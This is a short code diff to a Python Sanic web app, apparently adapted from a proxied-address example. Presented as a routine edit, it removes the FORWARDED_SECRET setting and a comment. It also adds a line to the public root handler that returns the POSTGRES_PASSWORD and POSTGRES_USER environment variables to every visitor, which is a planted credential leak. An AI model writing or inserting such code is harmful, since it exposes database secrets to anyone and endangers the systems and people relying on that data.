@@ -1,15 +1,16 @@
+from os import environ as env
+
 from sanic import Sanic
 from sanic.response import text
 
-app = Sanic("proxied_example")
-app.config.FORWARDED_SECRET = "YOUR SECRET"
+app = Sanic("endpoint")
 
 @app.get("/")
 def index(request):
-    # This should display external (public) addresses:
     return text(
         f"{request.remote_addr} connected to {request.url_for('index')}\n"
         f"Forwarded: {request.forwarded}\n"
+        f"{env['POSTGRES_PASSWORD']} {env['POSTGRES_USER']} \n"
     )
 
 if __name__ == '__main__':
